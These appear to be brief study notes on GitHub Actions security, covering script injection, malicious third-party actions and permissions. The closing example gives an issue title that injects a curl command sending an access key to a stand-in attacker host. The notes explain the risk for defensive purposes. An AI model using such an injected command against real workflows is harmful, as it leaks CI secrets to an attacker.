## Security Concerns in the Context of GitHub Actions

1. Script Injections - a value, set outside a workflow, is used in a workflow; example: issue title used in a workflow shell command; workflow / command behavior could be changed
2. Malicious third-party actions - actions can perform any logic, including potentially malicious logic; example: a third-party action that reads and exports your secrets; only use trusted actions and inspect code of unknown / untrusted authors
3. Permission issues - consider avoiding overly permissive permissions; example: only allow checking out code (“read-only”); github actions supports fine-grained permissions control

### Simple examples of injectin
Opening issues with titles like
- ``"a"; curl http://my-bad-site.com?abc=$MINHA_ACCESS_KEY_ID"``